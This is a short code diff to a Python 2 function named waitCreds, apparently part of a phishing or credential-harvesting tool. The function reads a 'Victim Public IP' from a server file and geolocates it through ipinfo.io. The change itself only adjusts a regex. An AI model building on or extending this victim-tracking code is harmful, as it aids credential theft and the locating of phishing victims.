@@ -148,7 +148,7 @@ def waitCreds():
         with open('Server/www/ip.txt') as creds:
             lines = creds.read().rstrip()
         if len(lines) != 0: 
-            ip = re.match('victim public ip: (.*)', lines).group(1)
+            ip = re.match('Victim Public IP: (.*?)\n', lines).group(1)
             resp = urlopen('https://ipinfo.io/%s/json' % ip).read()
             ipinfo = json.loads(resp)
             matchObj = re.match('^(.*?),(.*)$', ipinfo['loc'])
@@ -163,7 +163,6 @@ def waitCreds():
             print '======================================================================'.format(RED, END)
             
         creds.close()
-        
         
 
 def runPEnv():
